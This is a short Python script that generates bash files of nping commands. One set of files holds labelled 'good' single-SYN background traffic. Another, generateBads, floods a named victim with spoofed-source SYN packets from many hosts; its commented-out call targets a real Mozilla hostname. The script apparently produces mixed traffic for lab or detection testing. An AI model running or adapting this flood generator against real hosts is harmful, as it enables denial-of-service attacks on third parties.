
import random

def generateRandomIndex(inputlist):
    '''(list of str)->str'''
    
    return random.choice(inputlist)

def readHostFile(fileToPen):
    '''(str)->list of str'''
    lines=open(fileToPen,'r')
    line=lines.readlines()
    listOfHost=[]
    for i in line:
        listOfHost.append(i.strip())
    s = set(listOfHost) 
    return list(s)


def generateBads(hostsFile, victim):

    output = open('attack_'+victim+'.sh', 'w')
    output.write("#!/bin/bash\n\n")

    hostsList=readHostFile(hostsFile)

    for hs in hostsList:
        scriptLine= 'nping --tcp -S ' + hs + ' -p 80 --flags syn ' + victim + ' -c 500 --delay 20ms &\n'

        output.write(scriptLine)

    output.close()
        

def generateScripts(server,host):

    serversList=readHostFile(server)
    hostsList=readHostFile(host)

    random.shuffle(serversList)

    serversList = serversList[:7]

    uniqueList = set(serversList)

    uniqueList.add('93.184.220.20')
    uniqueList.add('65.54.189.53')
    uniqueList.add('82.199.80.141')

    serversList = list(uniqueList)

    goodsTraffic = [] 

    for hs in hostsList:

        # sname = hs.split('.')[-1] + ".sh"

        # starter.write( "./{0} &\n".format(sname) )

        # output = open(sname, 'w')

        # output.write("#!/bin/bash\n")
        # output.write("sleep " + str(random.uniform(0.5, 1)) + "\n" )

        # generate random traffic for a given host
        for i in range(30):
            serverName = generateRandomIndex(serversList)
            scriptLine= 'nping --tcp -S ' + hs + ' -p 80 --flags syn ' + serverName + ' -c 1\n'

            goodsTraffic.append(scriptLine)

            #output.write(scriptLine)
            #output.write("sleep 1\n")

        #output.close()

    starter = open('start_goods.sh', 'w')

    starter.write("#!/bin/bash\n\n")

    random.shuffle(goodsTraffic)

    trafficQty = len(goodsTraffic)

    numberOfScripts = 10

    avgTrafficPerScript = trafficQty/numberOfScripts

    for i in range(numberOfScripts):
        sname = str(i)+'.sh'

        command = './{0} &\n'.format(sname)

        starter.write(command)

        output = open(sname, 'w')

	output.write("#!/bin/bash\n\n")

        begin = i*avgTrafficPerScript
        end   = begin + avgTrafficPerScript

        lines = goodsTraffic[begin:end]

        output.writelines(lines)

        output.close()

    #lines = "\n".join(goodsTraffic)

    #starter.write(lines)

    starter.close()
            

#run 


generateScripts('input.txt','hosts.txt')
#generateBads('bad_hosts.txt', 'it.fxfeeds.mozilla.com')
